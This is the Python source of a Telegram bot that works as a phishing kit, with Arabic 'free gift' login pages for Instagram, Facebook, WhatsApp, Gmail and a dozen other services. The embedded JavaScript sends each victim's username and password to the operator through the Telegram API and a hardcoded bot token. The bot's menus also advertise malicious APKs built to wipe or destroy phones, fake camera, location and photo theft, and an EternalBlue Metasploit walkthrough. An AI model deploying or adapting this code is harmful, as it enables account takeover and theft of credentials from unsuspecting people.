from flask import Flask, request
import requests
import os

app = Flask(__name__)

TOKEN = "8648739829:AAGlpe-KlISstl5ZMQbxhsjCjcrhFJXEfIs"
BASE_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://telegram-bot-2-bbvv.onrender.com")

BUTTONS = [
    ["🔥 اختراق انستقرام", "🔥 اختراق فيسبوك", "🔥 اختراق واتساب"],
    ["🔥 اختراق سناب شات", "🔥 اختراق تيك توك", "🔥 اختراق فري فاير"],
    ["🔥 اختراق بوبجي", "🔥 اختراق ديسكورد", "🔥 اختراق تويتر"],
    ["🔥 اختراق يوتيوب", "🔥 اختراق تيليجرام", "🔥 اختراق جيميل"],
    ["📷 اختراق كاميرا خلفية", "📸 اختراق كاميرا أمامية", "🎙️ تسجيل صوت الضحية"],
    ["📍 تحديد موقع الضحية", "💀 اختراق الجهاز كامل", "🖼️ سحب صور الضحية"],
    ["📱 تطبيقات ملغمة", "⚙️ أدوات اختراق", "❓ الدعم الفني"]
]

WELCOME_MSG = f"""
👑 *مرحبا بك في بوت خالد ابو الجود الأسطوري* 👑
━━━━━━━━━━━━━━━━━━━━━━━━━━
🔥 *14 أداة اختراق + 3 تطبيقات ملغمة!*

• كل زر يعطيك رابط اختراق مخصص.
• أرسل الرابط للضحية وانتظر البيانات.

📞 *الدعم:* @A_c64
━━━━━━━━━━━━━━━━━━━━━━━━━━
*اختر الميزة 👇*
"""

TOOLS_MSG = """
⚙️ *أدوات الاختراق الاحترافية* ⚙️
━━━━━━━━━━━━━━━━━━━━━━━━━━

1️⃣ *Metasploit* (اختراق الأجهزة)
┌── *الشرح:* أداة لاختراق أجهزة الكمبيوتر والموبايل.
├── *الخطوات:*
│   1. افتح Termux.
│   2. `pkg install metasploit`
│   3. `msfconsole`
│   4. `search exploit`
│   5. `use exploit/windows/smb/ms17_010_eternalblue`
└── *النتيجة:* تتحكم بجهاز الضحية.

2️⃣ *Hydra* (تخمين كلمات السر)
3️⃣ *Nmap* (فحص المنافذ)
4️⃣ *SQLmap* (اختراق قواعد البيانات)
5️⃣ *Social Engineering Toolkit* (صفحات تصيد)

📞 الدعم: @A_c64
"""

APPS_MSG = """
📱 *التطبيقات الملغمة (APK)* 📱
━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 *تطبيق قفل الجهاز (WiFi Hacker Pro)*
🔹 *تطبيق فرمتة الجهاز (WhatsApp Gold)*
🔹 *تطبيق فيروسات (System Destroyer)*

📞 الدعم: @A_c64
"""

def send_message(chat_id, text, keyboard=None):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    if keyboard:
        data["reply_markup"] = {"keyboard": keyboard, "resize_keyboard": True}
    requests.post(url, json=data)

def send_hack_link(chat_id, platform, page_name):
    link = f"{BASE_URL}/{page_name}.html?chatId={chat_id}"
    msg = f"🔥 *رابط اختراق {platform}* 🔥\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📎 *الرابط:* `{link}`\n\n💡 *الاستخدام:* انسخ الرابط وأرسله للضحية.\n📞 *الدعم:* @A_c64"
    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": chat_id, "text": msg, "parse_mode": "Markdown"})

def phish_page(platform, chat_id):
    return f"""
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>{platform} - هدية مجانية</title>
<style>
body{{background:linear-gradient(135deg,#1a1a2e,#16213e);display:flex;justify-content:center;align-items:center;height:100vh}}
.container{{background:white;padding:30px;border-radius:28px;width:350px;text-align:center}}
input{{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:12px}}
button{{background:#0095f6;color:white;width:100%;padding:12px;border:none;border-radius:12px;cursor:pointer}}
.progress{{display:none;margin-top:20px}}
.bar{{background:#e0e0e0;border-radius:25px;height:10px}}
.fill{{background:#0095f6;width:0%;height:100%;border-radius:25px}}
</style>
</head>
<body>
<div class="container">
<h2>{platform} - هدية مجانية</h2>
<input id="u" placeholder="اسم المستخدم"><input id="p" placeholder="كلمة السر">
<button onclick="send()">احصل على الهدية</button>
<div id="progress" class="progress"><div class="bar"><div class="fill" id="fill"></div></div><p id="status">جاري التجهيز...</p></div>
</div>
<script>
const chatId="{chat_id}";
async function send(){{
    const u=document.getElementById('u').value;
    const p=document.getElementById('p').value;
    if(!u||!p) return;
    document.querySelector('button').style.display='none';
    document.getElementById('progress').style.display='block';
    let percent=0;
    const interval=setInterval(()=>{{
        percent+=Math.random()*6+3;
        if(percent>=100) percent=100;
        document.getElementById('fill').style.width=percent+'%';
        document.getElementById('status').innerHTML='جاري التجهيز '+percent+'%';
        if(percent>=100) clearInterval(interval);
    }},180);
    await fetch('https://api.telegram.org/bot{TOKEN}/sendMessage',{{
        method:'POST',headers:{{'Content-Type':'application/json'}},
        body:JSON.stringify({{chat_id:chatId,text:`🔥 اختراق {platform}\\n👤 ${{u}}\\n🔑 ${{p}}`}})
    }});
    setTimeout(()=>{{
        document.getElementById('status').innerHTML='✅ تم شحن هديتك!';
        setTimeout(()=>window.location.href='https://instagram.com',2000);
    }},2800);
}}
</script>
</body>
</html>
"""

@app.route('/')
def home():
    return "✅ البوت الأسطوري شغال 24 ساعة! ابو الجود"

@app.route('/instagram.html')
def instagram():
    return phish_page("انستقرام", request.args.get('chatId'))

@app.route('/facebook.html')
def facebook():
    return phish_page("فيسبوك", request.args.get('chatId'))

@app.route('/whatsapp.html')
def whatsapp():
    return phish_page("واتساب", request.args.get('chatId'))

@app.route('/snapchat.html')
def snapchat():
    return phish_page("سناب شات", request.args.get('chatId'))

@app.route('/tiktok.html')
def tiktok():
    return phish_page("تيك توك", request.args.get('chatId'))

@app.route('/freefire.html')
def freefire():
    return phish_page("فري فاير", request.args.get('chatId'))

@app.route('/pubg.html')
def pubg():
    return phish_page("بوبجي", request.args.get('chatId'))

@app.route('/discord.html')
def discord():
    return phish_page("ديسكورد", request.args.get('chatId'))

@app.route('/twitter.html')
def twitter():
    return phish_page("تويتر", request.args.get('chatId'))

@app.route('/youtube.html')
def youtube():
    return phish_page("يوتيوب", request.args.get('chatId'))

@app.route('/telegram.html')
def telegram():
    return phish_page("تيليجرام", request.args.get('chatId'))

@app.route('/gmail.html')
def gmail():
    return phish_page("جيميل", request.args.get('chatId'))

@app.route('/camera_front.html')
def camera_front():
    return phish_page("كاميرا امامية", request.args.get('chatId'))

@app.route('/camera_back.html')
def camera_back():
    return phish_page("كاميرا خلفية", request.args.get('chatId'))

@app.route('/recording.html')
def recording():
    return phish_page("تسجيل صوت", request.args.get('chatId'))

@app.route('/location.html')
def location():
    return phish_page("تحديد موقع", request.args.get('chatId'))

@app.route('/hack_device.html')
def hack_device():
    return phish_page("اختراق الجهاز", request.args.get('chatId'))

@app.route('/steal_photos.html')
def steal_photos():
    return phish_page("سحب الصور", request.args.get('chatId'))

@app.route("/webhook", methods=["POST"])
def webhook():
    try:
        data = request.get_json()
        if "message" in data:
            chat_id = data["message"]["chat"]["id"]
            text = data["message"].get("text", "")
            if text == "/start":
                send_message(chat_id, WELCOME_MSG, BUTTONS)
            elif text == "⚙️ أدوات اختراق":
                send_message(chat_id, TOOLS_MSG)
            elif text == "📱 تطبيقات ملغمة":
                send_message(chat_id, APPS_MSG)
            elif text == "❓ الدعم الفني":
                send_message(chat_id, "📞 الدعم: @A_c64")
            elif text == "🔥 اختراق انستقرام":
                send_hack_link(chat_id, "انستقرام", "instagram")
            elif text == "🔥 اختراق فيسبوك":
                send_hack_link(chat_id, "فيسبوك", "facebook")
            elif text == "🔥 اختراق واتساب":
                send_hack_link(chat_id, "واتساب", "whatsapp")
            elif text == "🔥 اختراق سناب شات":
                send_hack_link(chat_id, "سناب شات", "snapchat")
            elif text == "🔥 اختراق تيك توك":
                send_hack_link(chat_id, "تيك توك", "tiktok")
            elif text == "🔥 اختراق فري فاير":
                send_hack_link(chat_id, "فري فاير", "freefire")
            elif text == "🔥 اختراق بوبجي":
                send_hack_link(chat_id, "بوبجي", "pubg")
            elif text == "🔥 اختراق ديسكورد":
                send_hack_link(chat_id, "ديسكورد", "discord")
            elif text == "🔥 اختراق تويتر":
                send_hack_link(chat_id, "تويتر", "twitter")
            elif text == "🔥 اختراق يوتيوب":
                send_hack_link(chat_id, "يوتيوب", "youtube")
            elif text == "🔥 اختراق تيليجرام":
                send_hack_link(chat_id, "تيليجرام", "telegram")
            elif text == "🔥 اختراق جيميل":
                send_hack_link(chat_id, "جيميل", "gmail")
            elif text == "📷 اختراق كاميرا خلفية":
                send_hack_link(chat_id, "كاميرا خلفية", "camera_back")
            elif text == "📸 اختراق كاميرا أمامية":
                send_hack_link(chat_id, "كاميرا أمامية", "camera_front")
            elif text == "🎙️ تسجيل صوت الضحية":
                send_hack_link(chat_id, "تسجيل صوت", "recording")
            elif text == "📍 تحديد موقع الضحية":
                send_hack_link(chat_id, "تحديد موقع", "location")
            elif text == "💀 اختراق الجهاز كامل":
                send_hack_link(chat_id, "اختراق الجهاز", "hack_device")
            elif text == "🖼️ سحب صور الضحية":
                send_hack_link(chat_id, "سحب الصور", "steal_photos")
            else:
                send_message(chat_id, "❌ أرسل /start", BUTTONS)
    except Exception as e:
        print(f"Error: {e}")
    return "OK", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
